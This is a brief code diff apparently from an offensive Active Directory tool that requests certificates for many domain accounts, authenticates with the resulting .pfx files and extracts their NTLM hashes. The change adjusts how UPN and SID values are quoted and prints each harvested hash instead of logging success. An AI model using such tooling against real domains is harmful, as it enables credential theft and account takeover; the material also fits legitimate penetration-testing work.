@@ -126,8 +126,8 @@ def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, tar
     logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")
 
     def fetch_cert(account):
-        upn = f"'{account.spn}'"
-        sid = f"'{account.sid}'"
+        upn = f'{account.spn}'
+        sid = account.sid
         dc_netbios_domain = get_dc_netbios_from_fqdn(dc_fqdn)
         pfx_file = f"{account.usernameLower}_{dc_netbios_domain}.pfx"
         pfx_filepath = os.path.join(certificates_folder, pfx_file)
@@ -204,7 +204,7 @@ def authenticate_accounts(accounts, dc_ip, proxychains, output_file):
                         try:
                             ntlm_hash = output.split('\n')[-1].split(': ')[1]
                             out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
-                            logger.success(f"🔑 Successfully authenticated {account.username} - NTLM Hash stored")
+                            print((f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n'))
                         except IndexError:
                             logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {output}")
 
